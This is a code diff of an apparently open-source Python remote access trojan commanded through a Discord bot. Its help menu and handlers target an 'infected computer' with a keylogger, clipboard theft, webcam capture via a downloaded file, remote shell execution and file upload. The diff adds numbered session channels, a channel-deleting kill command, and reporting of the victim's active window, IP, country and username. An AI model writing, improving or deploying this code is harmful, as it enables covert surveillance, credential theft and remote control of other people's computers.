@@ -3,7 +3,6 @@ import winreg
 import ctypes
 import sys
 import os
-import uuid
 import random
 import time
 import subprocess
@@ -15,13 +14,11 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = '' #Put the token of your discord bot here
+token = '' #Insert your token here
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
-chosen = None
-uuidgen = None
 helpmenu = """
 Availaible commands are :
 
@@ -36,7 +33,7 @@ Availaible commands are :
 --> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with image attachment)
+--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
@@ -63,16 +60,32 @@ async def on_ready():
         data = json.loads(url.read().decode())
         flag = data['country_code']
         ip = data['IPv4']
-    global uuidgen
-    uuidgen = str(uuid.uuid4())
     import os
-    game = discord.Game(f"Controlling : {platform.system()} {platform.release()}"  )
-    await client.change_presence(status=discord.Status.online, activity=game)
-    newchannel = await client.guilds[0].create_text_channel(uuidgen)
-    channel_ = discord.utils.get(client.get_all_channels(), name=uuidgen)
+    total = []
+    global number
+    number = 0
+    global channel_name
+    channel_name = None
+    for x in client.get_all_channels(): # From here we look through all the channels,check for the biggest number and then add one to it
+        total.append(x.name)
+        for y in range(len(total)): #Probably a better way to do this
+            if "session" in total[y]:
+                import re
+                result = [e for e in re.split("[^0-9]", total[y]) if e != '']
+                biggest = max(map(int, result))
+                number = biggest + 1
+            else:
+                pass        
+    if number == 0:
+        channel_name = "session-1"
+        newchannel = await client.guilds[0].create_text_channel(channel_name)
+    else:
+        channel_name = f"session-{number}"
+        newchannel = await client.guilds[0].create_text_channel(channel_name)
+    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    value1 = f"@here :white_check_mark: New session opened {uuidgen} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
+    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
     if is_admin == True:
         await channel.send(f'{value1} | :gem:')
     elif is_admin == False:
@@ -95,9 +108,16 @@ def volumedown():
 
 @client.event
 async def on_message(message):
-    if message.channel.name != uuidgen:
+    if message.channel.name != channel_name:
         pass
     else:
+        import win32gui
+        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        game = discord.Game(f"Visiting: {window}")
+        await client.change_presence(status=discord.Status.online, activity=game)
+        if message.content.startswith("!kill"):
+            channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
+            await channel_to_delete.delete()
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
@@ -132,7 +152,7 @@ async def on_message(message):
             volumedown()
             await message.channel.send("[*] Volume put to 0%")
 
-        if message.content == "!webcampic": # This module downloads a file over the internet to take a webcampic this is not optimal at all but avoids adding many unnecessary megabytes to exe if compiled.
+        if message.content == "!webcampic": #Here we download a file over the internet to take a picture ,not very efficient but every other "pythonic" ways i've found of taking a picture requiered to add heavy modules which added dozens of mb to final exe if compiled so we'll roll with that
             import os
             import urllib.request
             from zipfile import ZipFile
@@ -210,7 +230,7 @@ async def on_message(message):
                 status = "ok"
                 return output
             import threading
-            shel = threading.Thread(target=shell) #Use of threading and a global variable to avoid hanging if command is too long to produce an output 
+            shel = threading.Thread(target=shell) #Use of threading and a global variable to avoid hanging if command is too long to produce an output (probably a better way to do this)
             shel._running = True
             shel.start()
             time.sleep(1)
